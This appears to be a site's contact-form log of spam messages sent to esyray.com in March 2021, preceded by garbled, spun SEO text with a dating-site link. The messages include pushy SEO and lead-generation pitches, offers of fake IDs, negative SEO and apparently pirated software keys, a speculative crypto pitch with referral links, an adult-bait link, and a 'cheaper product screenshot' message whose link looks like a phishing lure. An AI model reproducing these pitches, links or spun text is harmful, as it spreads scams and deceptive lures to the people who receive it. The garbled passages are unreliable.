ben &lt;a href=http://charmingdate-fake-or-not.over-blog.com/&gt;charmdate&lt;/a&gt; Heath

why choose we've got to take pride in england stunning

garden , 2008

the next few paragraphs discusses the reasons why we must pleasure around uk

stunning. a sophisticated routine florists turn to

of look into many of these charming non-renewable states a floral arrangement may include versions which specifically practice

these dexterity together with.

craig Heath

an enclosed read the UK herb community

gardeners , 2008

this informative article mentions great britain refreshed flower

area. our organization enjoy the nature from

publication rack in addition to hot styles which are set to carry on of the future. farther along

attraction will be attracted to the feeling.

tim Cox

Nine stuff including member cancellations

quality business articles July 11, 2008

referring of your time chapter program. appears to fall apart, The most important perhaps the firing progress occurs. It's where the people excess evaluate the way was covered it's necessary becau.
+++ 2021-03-05 09:45:23 AM -- Email from: Mario Gonzalez, -- subject: Don’t pay until you get on the 1rst Page of Google, -- email: mysolutions360@gmail.com, -- Message is: Hi, are you still in charge of esyray.com ? 
 
If you take 30 sec to read this email, we could help you 2X-5X your business. 
 
Most SEO companies will ask you to pay upfront with no guarantee that your website will rank on Google. 
 
We are different ... 
 
Our company specializes in Pay Per Performance SEO. Which means – 
We get your business on the first page of Google before we get paid for our service. 
 
I know that’s a bold statement but we can back it up with 9 years of success in this industry. 
 
If you’re interested in getting on the first page of Google, and only pay if you get there, 
let me know when is a good time for a call. 
 
Get full details here or send us a message to mcmarketing360@hotmail.com: 
https://getmoreclientsfaster.com/performance-based-seo/
+++ 2021-03-05 02:11:59 PM -- Email from: , -- subject: Do you want to know how to improve a relationship with your partner significantly?, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Please allow us to offer you our bestseller – “Compatibility Of Partners” report. This report can significantly help you determine the quality of your relationship with your spouse. You will get detailed information on how much you are compatible with your girlfriend/boyfriend, wife/husband, or any other person of your interest in many related areas. You will be able to find out the way how to overcome difficulties in your relationship as well. Anyway, we can prepare absolutely accurate and very detailed Natal Chart and 1-Year Forecast Of Events reports for you and your loved ones. Please visit https://astrologicalstudio.com for more information. Best regards, Brian WRIGHT Eng., WEXX Astrological Studio, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-03-08 06:33:05 AM -- Email from: Riley Waldo, -- subject: For Anyone Looking To Start, Scale and Grow A Digital Business In 2021, -- email: riley@sesforyou.com, -- Message is: Hi,
 
I'm always asked what is the quickest way to make money online, when you are just starting out? Well here's the definitive answer that question:
 
==&gt; https://sesforyou.com
 
New Book Reveals How I Built A 7-Figure Online Business Using Nothing But Ethical Email Marketing To Drive Revenue, Sales and Commissions...
 
==&gt; https://sesforyou.com
 
Regards,
SesForYou.com
+++ 2021-03-08 12:04:00 PM -- Email from: Nicole Rideout, -- subject: Important Reminder, -- email: nicole@alexadirectory.link, -- Message is: Hey! 

Have you remembered to activate voice search for your business?

Activate it here in 30 seconds:

https://alexadirectory.link/abcc1/?=esyray.com

Without activation, customers may not be able to find esyray.com with voice searches on Google, Amazon Alexa or mobile phones.

Nicole Rideout
Voice Activation Follow-up Specialist














 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://alexadirectory.link/out.php?site=esyray.com
+++ 2021-03-08 12:45:17 PM -- Email from: Dong Coulombe, -- subject: Verified google reviews for esyray.com , have arrived!, -- email: dong.coulombe@gmail.com, -- Message is: Good morning,
I'm ,
How are you doing regarding your Business Reviews?
Google reviews increase trust and credibility. This might sound strange, but a vast most of 18-35-year-olds trust online reviews around recommendations from relatives and buddies.
https://your-google-reviews.com
Kind Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://one-two-seo.com/?unsubscribe=esyray.com
+++ 2021-03-08 11:59:56 PM -- Email from: Mike Erickson, -- subject: Increase sales for esyray.com, -- email: see-email-in-message@monkeydigital.co, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Erickson
 
support@monkeydigital.co 
Monkey Digital
+++ 2021-03-09 08:53:00 AM -- Email from: Laverne Goble, -- subject: Software for sale – Special low prices, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Sirs We have the license keys for the following Windows &amp; MacOS software for sale. Software for Windows: Scrapebox with YellowPages Scraper Premium Plug-In * Windows 10 – Home Edition * Office 2010 * eM client * GSA Website Contact * GSA E-mail Spider * GSA E-mail Verifier * GSA Search Engine Ranker * GSA SEO Indexer * Axandra Internet Business Promoter * Management-Ware E-mail Finder * IOLO System Mechanic Pro Software for MacOS: FollowAdder * MaxBulk Mailer Pro v8 * Mac DVDRipper Pro * App Cleaner &amp; Uninstaller * Wondeshare Filmora 9 * FLUME * Parallels Desktop 16 * iSkysoft iMedia Converter DeLuxe * Transmit 5 * Techtool Pro 8 Full Version All license keys are available for immediate delivery via e-mail upon your payment. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-03-09 03:12:48 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-03-09 03:14:07 PM -- Email from: Lara Gorton, -- subject: Important, -- email: lara@bizvideo.link, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.bizvideo.link/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Lara

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://bizvideo.link/out.php/?site=esyray.com
+++ 2021-03-10 12:10:13 AM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric.jones.z.mail@gmail.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE https://talkwithwebvisitors.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-03-10 04:38:56 AM -- Email from: Latashia, -- subject: What causes lack of deep sleep?, -- email: ronaldFum@yahoo.com, -- Message is: Why Deep Sleep is Important and How to Improve It? Resurge is a powerful potent fat burning formula by John Barban, which does not only work for melting off fat, but also regulates the sleep cycle too. In fact, this product only works when a person is in his deep sleep. 
https://j.mp/3ssZjke
+++ 2021-03-10 04:39:50 AM -- Email from: Josephine Artis, -- subject: Create professional videos to promote esyray.com, -- email: josephine.artis@gmail.com, -- Message is: Hi,

We're wondering if you've ever considered taking the content from esyray.com and converting it into videos to promote on Youtube? You simply add the text and it converts it into scenes that make up a full video. No special skills are needed, and there's access to over 1 million images/clips that can be used.

You can read more about the software here: https://www.vidnami.com/c/CoolVer-vn-freetrial

Kind Regards,
Josephine
+++ 2021-03-10 08:43:36 AM -- Email from: Groß, -- subject: Ihre Anfrage bei uns., -- email: postmaster@folmax.de, -- Message is: Abfallsäcke-schwarz, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 64,99 (Brutto, frei Haus).

Abfallsäcke-blau/rot/gelb, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 67,99 (Brutto, frei Haus).

Abfallsäcke-schwarz, 240L(1100x1300), 40 mµ. 1 Karton/300 St. € 66,99. (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 60L(600x900), 40 mµ. 1 Karton/600 St. € 44,99 (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 35L(550x600), 40 mµ. 1 Karton/750 St. € 47,99 (Brutto, frei Haus).

Papiersäcke, 120L (650x1150), 1 Karton/150 St. € 88,99 (Brutto, frei Haus).

Ihre Foly GmbH
Mehr Info:

http://jana-gmbh.cam/
+++ 2021-03-11 08:04:50 AM -- Email from: Reagan McClemans, -- subject: , -- email: reagan.mcclemans@gmail.com, -- Message is: Would you like to check out how you can start your own business getting paid commissions for selling things online? Check out: http://bit.ly/make--money-with-affiliate-marketing
+++ 2021-03-11 05:01:08 PM -- Email from: Tegan Lentz, -- subject: , -- email: lentz.tegan@gmail.com, -- Message is: Want free traffic? Let me show you 5 high volume traffic websites where you can advertise your website completely free: https://bit.ly/free-traffic-and-sales
+++ 2021-03-11 05:36:38 PM -- Email from: Boscoegd, -- subject: latamdate review, -- email: yourmail@mail.com, -- Message is: engin with Tumblr

Viyoled ne zamand ayn lo yaln websit odas Bir saa sonra gelip onu alacak, Bi dorln'kte Bourbon Cafe'de kahve Snemaya gdeceklerd sonra. Bir saat l'ordre de belki iki saat vard baseball cap Odas oturmu bekliyordu, Lo yaln f Duvara yaslam s yaa ourmu elleriyle oynuyor, e g ince dudamiriellelar websitildomedi s the good elli i gelene adar oturacat Uzuyordu sa ensesine a sar sar estireliydi ir u sar sa seviyor uydu acaa? whats up s websit Viyolet'i seviyor muydu acaba? Viymcaolet parma onad Violet Engin'i sevior mudu acaba? hey all s b parma kendisinden biraz uzakla pencerenin tuttu. A bulutlar sallan parlad Geri takt parma Viyolet ne zamand ayn lo yaln t odasThat the advantage with PartingOut portions don need to be inventoried to receive users to find them schedule serves up about them. those that create a list, out &lt;a href=https://www.linkedin.com/in/latamdate-com-b3473985/&gt;latamdate.com reviews&lt;/a&gt; put in avatars, combined with directory several products, you are sure of there's need for, additional 1000 segments are being exposed to buyers likewise.

easiest way? it is called the purchaser mentioned PART the place where people list points available it become aware of on the car. indeed places you really couldn't look into might be information technology turn into a invaluable.

each and every way is the reason why record the game probability no ask for, if there is a demand home buyers will list the a portion individual. i didn't defined how you can word wide web sites and practices go away equipped with prompting our business to add new funding to ingredients thereafter hope you can purchase.
+++ 2021-03-12 12:36:22 AM -- Email from: Melania, -- subject: Rate my sexy naked photos, -- email: melania_stars1@gmail.com, -- Message is: Hi! rate my sexy naked photos -  https://bit.ly/3buzYko
+++ 2021-03-12 01:35:30 PM -- Email from: Groß, -- subject: Ihre Anfrage bei uns., -- email: postmaster@folmax.de, -- Message is: Abfallsäcke-schwarz, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 64,99 (Brutto, frei Haus).

Abfallsäcke-blau/rot/gelb, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 67,99 (Brutto, frei Haus).

Abfallsäcke-schwarz, 240L(1100x1300), 40 mµ. 1 Karton/300 St. € 66,99. (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 60L(600x900), 40 mµ. 1 Karton/600 St. € 44,99 (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 35L(550x600), 40 mµ. 1 Karton/750 St. € 47,99 (Brutto, frei Haus).

Papiersäcke, 120L (650x1150), 1 Karton/150 St. € 88,99 (Brutto, frei Haus).

Ihre Foly GmbH
Mehr Info:

http://afol99.info
+++ 2021-03-14 01:51:16 AM -- Email from: Hanna Brown, -- subject: Your business after Covid19, -- email: chitchatchannel01@gmail.com, -- Message is: The world after COVID19 is shaping up. Businesses that had virtual platforms performed best. The future will be more of the same. https://ChitChatChannel.com fills that gap by providing you with a Social Business Page— like Facebook, but which plugs into its own real-time ordering /shipping system, instantly creating an additional outlet for your business. It has other corporate features like its own 'zoom' or CHAD for Agile Tech Development. 
So, whatever your business: Restaurateur, Influencer, Retailer, Realtor, Educator, Tech-developer or what have you — you are right there, building your brand or team, and generating additional revenues or efficiencies through your new outlet – and partaking in the future digital economy. Sign up at https://chitchatchannel.com. Add me up on LinkedIn at: https://www.linkedin.com/in/hanna-brown-096a22b6
+++ 2021-03-14 05:04:29 AM -- Email from: Imogene Bottoms, -- subject: Negative SEO Services, -- email: bottoms.imogene@gmail.com, -- Message is: Hi there

If you ever need Negative SEO work, we offer it right here
https://speed-seo.net/product/negative-seo-service/


thank you
Peter Bottoms
Speed SEO Agency
support@speed-seo.net
+++ 2021-03-14 09:56:40 AM -- Email from: Groß, -- subject: Ihre Anfrage bei uns., -- email: postmaster@folmax.de, -- Message is: Abfallsäcke-schwarz, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 64,99 (Brutto, frei Haus).

Abfallsäcke-blau/rot/gelb, 120L(700x1100), 30 mµ. 1 Karton/750 St. € 67,99 (Brutto, frei Haus).

Abfallsäcke-schwarz, 240L(1100x1300), 40 mµ. 1 Karton/300 St. € 66,99. (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 60L(600x900), 40 mµ. 1 Karton/600 St. € 44,99 (Brutto, frei Haus).

Abfallsäcke-schwarz oder blau mit Zugband, 35L(550x600), 40 mµ. 1 Karton/750 St. € 47,99 (Brutto, frei Haus).

Papiersäcke, 120L (650x1150), 1 Karton/150 St. € 88,99 (Brutto, frei Haus).

Ihre Foly GmbH
Mehr Info:

http://afol99.info
+++ 2021-03-15 09:37:13 AM -- Email from: Mike Blomfield, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Hi there 
 
I have just checked  esyray.com for its Local SEO ranks and seen that your website could use an upgrade. 
 
We will improve your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
Start improving your local visibility with us, today! 
 
regards 
Mike Blomfield
 
Speed SEO Digital Agency 
support@speed-seo.net
+++ 2021-03-15 08:21:44 PM -- Email from: Gerard Ontiveros, -- subject: buy fake ids, -- email: ontiveros.gerard@gmail.com, -- Message is: The best fake id maker in the market for over 15 years

buy now
http://idgod.ch

read our reviews and testimonials
https://www.trustpilot.com/review/idgod.ch
https://scamadviser.com/check-website/idgod.ch
https://www.sitejabber.com/online-business-review?url=idgod.ch
+++ 2021-03-15 10:33:48 PM -- Email from: Ryan Mehry, -- subject: Google's power is extraordinary, -- email: reviewcarrier@protonmail.com, -- Message is: Hey, 
I’m the founder of ReviewCarrier, a google’s reviews digital agency. 
It’s designed for folks like you who want to boost their sales using Google Reviews so I’d love to know if you are interested to learn more. 
Now, I know your time is valuable. I don’t want you to feel like I’m trying to grab time from you. 
I’m very happy to offer you a discount for your first order because I appreciate it’s a weird one-off thing. 
If you want to boost your SEO and convert more customers thanks to Google Reviews feel free to reach out to contact@reviewcarrier.com 
Have a great day. 
- Ryan, Founder of http://reviewcarrier.com
+++ 2021-03-17 12:13:55 AM -- Email from: Nancee Ebner, -- subject: This Secret Can Help You Get MORE Buyers DAILY!, -- email: maband2000@gmail.com, -- Message is: Hello,

Are you struggling to get buyers...or do you need more buyers?

If so, then please read this short message.

We all know that buyers are the lifeblood of any business.

Without them...there would be no sales...and no money made.

Now, what if we can help you solve this buyer-getting problem?

Would you be interested in learning more?

If so, let me introduce you to a...HIDDEN SECRET software...that
can help you to...EASILY rank on the first page of Google...

So you can get buyers...DAILY, WEEKLY, and MONTHLY!

As you already know, Google is the MOST visited website in the world.

It gets a jaw-dropping 3.5 billion searches per day...including visits from
millions of buyers...who are already looking for your product or service.

However, the most difficult thing about Google is--how to get buyers from 
it--since you have to beat your competitors--and rank on the first page--in 
order for this to happen. 

And without ranking on the first page...YOU WON'T GET BUYERS? Why?
Because millions of visitors, don't bother to search through the second,
third, fourth or tenth pages of Google...for any keyword or niche.

It's no wonder your competitors and probably you...may already be 
paying Google ranking marketing agencies...anywhere from $500 to
$5,000 per month...just to rank on the first page...

Which is worth it, if you consider the increase in sales and profits, you
can make every month. 

That's why, as I said before, you need to have access to this wonder-working 
software...unlike anything you've ever seen...

And without paying the sometimes-high cost, Google ranking specialist charge
every month.

Plus, not only will it help you get buyers from Google...it will also allow 
you to DOMINATE your competitors on Google! 

And wait, till you see the price of this jaw-dropping Google-Page-1
ranking software...you won't believe just how cheap it is.

So, here's the deal...if you too want to rank on the first page of Google...
so you can get MORE buyers...EVERYDAY...and want to join thousands
of businesses across the globe...

Who have already and QUIETLY been using this amazing software...for the last
7 years...to grab thousands of buyers...and dramatically increase sales...

Then just click on the link below...for the thrilling details.

And when you visit, you'll see for yourself,  testimonials of satisfied businesses,
who have successfully ranked their websites on the first page of Google...and
are enjoying the flood of CONSISTENT buyers...sent to them by Google...all year!

                                       https://t2m.io/oswz9hi

Thank you for your time.

Sincerely,
John Eyubeh
+++ 2021-03-17 02:11:11 AM -- Email from: Ernest Nutter, -- subject: Increase your sales with backlinks, -- email: ernest.nutter57@gmail.com, -- Message is: Good Afternoon 
Hope you’re great, and that business is profitable.
To become the top and quite a few known company with your field, you may need this tool to convert results in clients from the site. 
https://backlinks-generator.com
Warm regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://one-two-seo.com/?unsubscribe=esyray.com
+++ 2021-03-17 08:27:35 AM -- Email from: Eric Jones, -- subject: Strike when the iron’s hot, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hey there, I just found your site, quick question…

My name’s Eric, I found esyray.com after doing a quick search – you showed up near the top of the rankings, so whatever you’re doing for SEO, looks like it’s working well.

So here’s my question – what happens AFTER someone lands on your site?  Anything?

Research tells us at least 70% of the people who find your site, after a quick once-over, they disappear… forever.

That means that all the work and effort you put into getting them to show up, goes down the tubes.

Why would you want all that good work – and the great site you’ve built – go to waste?

Because the odds are they’ll just skip over calling or even grabbing their phone, leaving you high and dry.

But here’s a thought… what if you could make it super-simple for someone to raise their hand, say, “okay, let’s talk” without requiring them to even pull their cell phone from their pocket?
  
You can – thanks to revolutionary new software that can literally make that first call happen NOW.

Talk With Web Visitor is a software widget that sits on your site, ready and waiting to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re still there at your site.
  
You know, strike when the iron’s hot!

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

When targeting leads, you HAVE to act fast – the difference between contacting someone within 5 minutes versus 30 minutes later is huge – like 100 times better!

That’s why you should check out our new SMS Text With Lead feature as well… once you’ve captured the phone number of the website visitor, you can automatically kick off a text message (SMS) conversation with them. 
 
Imagine how powerful this could be – even if they don’t take you up on your offer immediately, you can stay in touch with them using text messages to make new offers, provide links to great content, and build your credibility.

Just this alone could be a game changer to make your website even more effective.

Strike when  the iron’s hot!

CLICK HERE http://talkwithcustomer.com to learn more about everything Talk With Web Visitor can do for your business – you’ll be amazed.

Thanks and keep up the great work!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – you could be converting up to 100x more leads immediately!   
It even includes International Long Distance Calling. 
Stop wasting money chasing eyeballs that don’t turn into paying customers. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-03-17 05:02:33 PM -- Email from: Kristie Moore, -- subject: Voice Search, -- email: kristie@business-directory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://business-directory.link/abcc1/?=esyray.com


Kristie
Voice Activation Follow-up Specialist
Business Directory Link



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://business-directory.link/out.php?site=esyray.com
+++ 2021-03-17 05:50:16 PM -- Email from: David Smith, -- subject: Paid Post Opportunities On esyray.com, -- email: david.outreach0@gmail.com, -- Message is: Hello there, 
 
We’ve contacted you in the past for guest post collaboration but didn’t hear back from you. 
 
Do you accept guest posts on your blog? If yes, how much do you charge for an article? 
 
Provide Your Website Details: https://forms.gle/g1tLTgmgCqbrwut68 
 
Looking forward to hearing from you. 
 
Thanks &amp; Regards 
 
David Smith 
 
Outreach Executive
+++ 2021-03-18 05:59:40 AM -- Email from: Tory Ferguson, -- subject: Hi, -- email: tory.ferguson@outlook.com, -- Message is: Hi

I have a question, i see a lot of items in a shop that you olso sell in your site, But there items are 60% cheaper,  i have made a screenshot https://screenshot-product.photo/6543 of the product.
Well my question is what is the difference between your store.
Is it the quality or something else, I hope you can answer my question.

Sincerely
Tory Ferguson

&quot;Sent from my iPhone&quot;
+++ 2021-03-18 11:48:23 AM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-03-18 08:35:47 PM -- Email from: Keisha Duarte, -- subject: , -- email: duarte.keisha@yahoo.com, -- Message is: Do you want zero cost advertising for your website? Check out: http://bit.ly/submit-free-ads-here
+++ 2021-03-20 06:10:58 PM -- Email from: Norberto Griffiths, -- subject: Re-check your website performance - esyray.com, -- email: griffiths.norberto@gmail.com, -- Message is: Good Afternoon 
Hope you’re excellent, and that the company is good.
Look at this tool to get you new customers, asap from the traffic. 
https://your-it-technicians.com/backlinks-generator
Regards,

P.S. We offer the best marketing services on our website, still not interested? Here is an easy, 1-click unsubscribe link: https://your-it-technicians.com/?unsubscribe=esyray.com
+++ 2021-03-20 08:03:44 PM -- Email from: Artem Design, -- subject: Hire a designer, -- email: duck.design.artem@gmail.com, -- Message is: Hello! 
 
I hope that I'm not bothering you. I’m a business development manager at Duck.Design (https://www.duck.design/hire-designer) . I thought that your company is probably looking for a designer to join your team, and I want to offer you our trial of graphic or web designer for $1 per 1 day. You can outsource any type of tasks for our design team. 
 
Our designer will work for you only, perform any design-related work, including logos, banners, packaging and web design (websites, app design) and even motion design (explainer, promo videos) etc. 
 
If you are interested, book a call here https://calendly.com/duck-design/15min?back=1&amp;month=2021-02 
 
Thank you for your time! 
 
Email: duck.design.artem@gmail.com
+++ 2021-03-20 09:24:51 PM -- Email from: Groß, -- subject: Ihre Anfrage bei uns., -- email: niehues-gmbh.de @gmail.com, -- Message is: Hochwertige Waren vom Produzent. Fabrikverkauf. Versand am gleichen Tag. Bis 95 % günstiger als auf dem Markt.



Müllsäcke Alle,     Sandsäcke,     Raschelsäcke,     Spänesäcke,

Kartonage,     Luftpolstertaschen,     Maxibrief,                    

Abdeckplane,     Abdeckfolie,     Baufolie,

Alufolie - Frischhaltefolie,     Alu Klebeband - Aluband,

Abklebeband,     Malerkrepp,     Klebeband mit Folie,     Malerkrepp mit Folie,

Antirutsch Streifen,    Klebebänder Alle,     Gewebeband,     Papierklebeband,       

Ddoppelseitiges Klebeband,   Schaumklebeband,     Reflektorband, 	Absperrband,
	
Kantenschutz,     Kantenschutzprofil,     Abdeckhaube,     Palettenhaube,

Reifentüten,     Umzugsdecken,     Möbeldecken,

Alles für Umreifung,     Umreifungsband,     Haspelspanner,     Klemmen,

Stretchfolie,     Handstretchfolie,     Maschinenstretchfolie

Unkrautvlies,     Malervlies,     Renoviervlies,

Luftpolsterfolie,     Alu Luftpolsterfolie,     Schaumfolie,     Alu Schaumfolie,

Sichtschutz,     Sonnenschutz,     Windschutz,

Glasschutzfolie,     Fensterschutzfolie,

Katzenstreu alle Sorten,     Arbeitshandschuhe und    Vieles mehr


auf http://www.afol99.art
+++ 2021-03-20 11:47:42 PM -- Email from: K Bradly, -- subject: Can you point me in the right direction for esyray.com?, -- email: kimberly+brad1@fixhacksite.com, -- Message is: Dear Madam/Sir, 

I hope you do not mind me introducing myself,  I'm Kim Bradley from malware removal and  web site optimization experts, fixhacksite.com  We work with organizations like esyray.com to optimize  web site performance and enhance security.

I have performed a website  optimization and performance audit on your site esyray.com, if you would like the  results please  visit fixhacksite.com and select 25 point free website security and  load speed audit and I will get it over to you.


With best regards
Kim Bradley ,
Kimberly@fixhacksite.com

Website Protector at  Https://fixhacksite.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/f?d=esyray.com
+++ 2021-03-21 11:44:54 AM -- Email from: Olivia Johnson, -- subject: Turn A Thousand Into A Million Via Cryptocurrencies, -- email: meeker.caroline@yahoo.com, -- Message is: Gd'Day Mate!

Firstly we are not selling anything.

Unless you have been living off the grid with no internet, the mainstream media has been reporting news on bitcoin and cryptocurrencies.

Tesla buys $1.5 billion in bitcoin, plans to accept it as payment
https://www.cnbc.com/2021/02/08/tesla-buys-1point5-billion-in-bitcoin.html

Weeks After $1B Bitcoin Purchase, MicroStrategy Buys Another $15M Worth Of Cryptocurrency
https://finance.yahoo.com/news/weeks-1b-bitcoin-purchase-microstrategy-163558608.html

If you are new to cryptocurrencies, our tip for you is NOT to buy Bitcoin now. There are literally thousands of cryptocurrencies, as with all things in life, some are gems (with potential to x10 or x100) and most are garbage which eventually will go to zero.

Bitcoin is the KING coin in the crypto world, all other crypto currencies are collectively known as altcoins.

What is altcoin season

While everyone has been focusin on Bitcoin, there is a term &quot;Altcoin Season&quot; when the prices of good altcoins can go up times 10 or even x 100 in a crazy rally. This is mainly due to speculators who have made crazy gains from Bitcoins to smaller cap coins in order to chase gains.

You can literally turn $1000 into $10,000 or even $100,000 in an altcoin season (which seems to be happening now).

After an altcoin rally which usually lasts 50 to 60 days, prices will crash hard (what goes up in a parabolic move must come down always).

And if you can turn $1000, into $10,000 during this altcoin rally which is happening soon, we advise you to rotate your profits into bitcoin (King coin) as Bitcoin becomes relatively &quot;cheap&quot; compared to altcoins until Nov this year.

You can likely turn $10,000 into $10000 in the next bitcoin run up until Nov 2021 (a repeat of what Bitcoin and the market did in the last bull run in 2017). History does not repeat exactly but history certainly rythmes!

And you have another chance to turn $10,000 into $1000,000 (thats 1 million) in the last leg of the altcoin rally which is likely to happen at the end of this year.

We understand there is no fundamentals to cryptos and this is a high risk game. But with the Federal Reserve holding down interest rates and printing more currencies (with the central banks around the world), the risk-reward for entering the crypto markets is simply too good.

Altcoins we recommend:

Zilliqa coin (ZIL) which you can buy in Binance (here -&gt; http://bit.ly/2L6ZySg)

ZIL coin is a project from Singapore, a country that is politically stable and widely known as a city that embraces Cryptocurrenies. The Central bank of Singapore has launched the Singapore Dollar as a crypto stable coin in Zilliaq blockchain.

https://www.mas.gov.sg/-/media/MAS/ProjectUbin/Project-Ubin-DvP-on-Distributed-Ledger-Technologies.pdf?la=en&amp;hash=2ADD9093B64A819FCC78D94E68FA008A6CD724FF

We believe you cannot go too wrong when you follow what the government of Singapore is pursuing. ZIL is currently trading around USD$0.20. You can buy ZIL coin in Binance, the world's biggest crypto currency exchange here: http://bit.ly/2L6ZySg


If you are interested to get involved with cryptos and consider joining this action, you can buy cryptos below:


Get started at the world's biggest and most established crypto exchange Binance at the link below:
http://bit.ly/2L6ZySg
+++ 2021-03-22 08:11:58 AM -- Email from: maygg, -- subject: продвижение сайтов раскрутка, -- email: pshalya13@mail.ru, -- Message is: Заказать seo поисковую оптимизацию сайта, Заказать услуги по продвижению сайта По всем возникшим вопросам Вы можете обратиться в скайп логин &lt;b&gt;pokras7777&lt;/b&gt;Раскрутка сайта под ключ 
.Так же собираем базы  Обратесь всегда будем рабы вам помочь https://seoprofisional.ru/bazy
